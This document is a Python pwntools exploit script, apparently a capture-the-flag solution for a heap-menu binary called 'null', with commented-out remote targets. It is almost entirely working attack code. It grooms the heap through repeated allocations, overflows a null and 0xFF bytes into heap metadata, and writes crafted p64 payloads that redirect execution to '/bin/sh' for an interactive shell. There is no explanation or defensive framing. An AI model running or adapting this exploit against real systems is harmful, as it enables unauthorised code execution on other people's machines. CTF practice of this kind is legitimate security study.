from pwn import *
context.log_level = "debug"

#s =remote("127.0.0.1",4545)
#s =remote("47.75.57.242",5000)
s= process('./null')
pause()
def action(size,pad,content,data=''):
    s.recvuntil('Action: ')
    s.sendline('1')
    s.recvuntil('Size: ')
    s.sendline(str(size))
    s.recvuntil('Pad blocks: ')
    s.sendline(str(pad))
    s.recvuntil('): ')
    s.sendline(str(content))
    if content == 1:
        s.recvuntil("Input: ")
        s.send(data)
cmd=s.recvline()
print cmd
#hash_data = input("result")
#s.sendline(hash_data)
#print cmd
#p=os.popen(cmd.strip())
#bufaddr = p.read()

s.sendline("i'm ready for challenge")
#action(0x18,0x0,1,'a'*0x16)
#sleep(1)
#s.sendline('\x00'+'\xFF'*8)
for i in range(0,16):
    print i
    action(0x1000-0x8,0x3E8,0)
action(0x1000-0x8,0x16E,0)
action(0xF30-0x8,0,0)

for i in range(0,32):
    print i
    action(0x1000-0x8,0x3E8,0)
action(0x1000-0x8,0x2DC,0)

action(0x1000-0x8,0,0)
pause()
action(0xFA0-0x8,0,1,'a'*(0xFA0-0x8-1))
sleep(1)
s.sendline('\x00'+'\xFF'*8)

#pause()
payload = 'a'*0x30+p64(0)*2+p64(0x0000000004000000) + p64(0x0000000004000000) + p64(0x0000000300000000)+p64(0)*9
payload1 = 'a'*0x30+p64(0)*2+p64(0x0000000004000000) + p64(0x0000000004000000) 
#payload2 = p64(0x0000000300000000)+p64(0x602032)*9
payload2 = p64(0x0000000300000000)+p64(0x60201D)*9
#action(0x1000,0,1,payload)
action(0x80,0,0)
action(0x720,0,0)
action(0x80,0,1,payload1[:-1])
sleep(1)
s.send('\x00'+payload2)
shellcmd = '/bin/sh;aaa'+p64(0x0000000000400978)
action(104,0,1,shellcmd.ljust(104,'\x00'))
s.interactive()
